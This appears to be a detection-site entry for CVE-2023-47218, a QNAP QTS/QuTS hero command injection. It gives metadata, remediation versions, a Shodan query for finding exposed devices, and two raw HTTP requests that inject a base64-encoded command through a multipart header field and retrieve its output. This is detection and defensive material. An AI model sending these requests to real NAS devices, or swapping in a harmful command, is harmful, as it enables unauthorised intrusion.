---
layout: post
cve_id: CVE-2023-47218
title: QNAP QTS and QuTS Hero - OS Command Injection
pcap: true
pcap_path: /pcaps/2023/CVE-2023-47218.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-47218.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: medium
impact: 'Unauthenticated attackers on the local network can execute arbitrary commands
  remotely, potentially compromising NAS devices and stored data.

  '
remediation: 'Update to QTS 5.1.5.2645 build 20240116 or later, QuTS hero h5.1.5.2647
  build 20240118 or later, or QuTScloud c5.1.5.2651 or later.

  '
reference:
- https://github.com/passwa11/CVE-2023-47218
- https://twitter.com/win3zz/status/1760224052289888668/photo/3
- https://www.rapid7.com/blog/post/2024/02/13/cve-2023-47218-qnap-qts-and-quts-hero-unauthenticated-command-injection-fixed/
- https://nvd.nist.gov/vuln/detail/CVE-2023-47218
- https://www.qnap.com/en/security-advisory/qsa-23-57
classification:
  cvss-metrics: CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:L
  cvss-score: 5.8
  cve-id: CVE-2023-47218
  cwe-id: CWE-77
  epss-score: 0.93293
  epss-percentile: 0.99794
  cpe: cpe:2.3:o:qnap:qts:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  shodan-query: ssl.cert.issuer.cn:"QNAP NAS",title:"QNAP Turbo NAS"
  product: qts
  vendor: qnap
tags:
- cve
- cve2023
- qnap
- qts
- quts
- rce
- intrusive
- vkev
- vuln
---

## ðŸ” Vulnerability Description
An OS command injection vulnerability has been reported to affect several QNAP operating system versions. If exploited, the vulnerability could allow users to execute commands via a network. We have already fixed the vulnerability in the following versions: QTS 5.1.5.2645 build 20240116 and later QuTS hero h5.1.5.2647 build 20240118 and later QuTScloud c5.1.5.2651 and later.


## ðŸŒ HTTP Request
```nohighlight
POST /cgi-bin/quick/quick.cgi?func=switch_os&todo=uploaf_firmware_image HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Connection: close
Content-Length: 170
Content-Type: multipart/form-data;boundary="avssqwfz"
Accept-Encoding: gzip

--avssqwfz
Content-Disposition: form-data; xxpcscma="field2"; zczqildp="%22$($(echo -n aWQ=|base64 -d)>yVA6GV)%22"
Content-Type: text/plain

skfqduny
--avssqwfzâ€“
```

```nohighlight
POST /cgi-bin/quick/yVA6GV HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Transfer-Encoding: chunked
Accept-Encoding: gzip

0
```

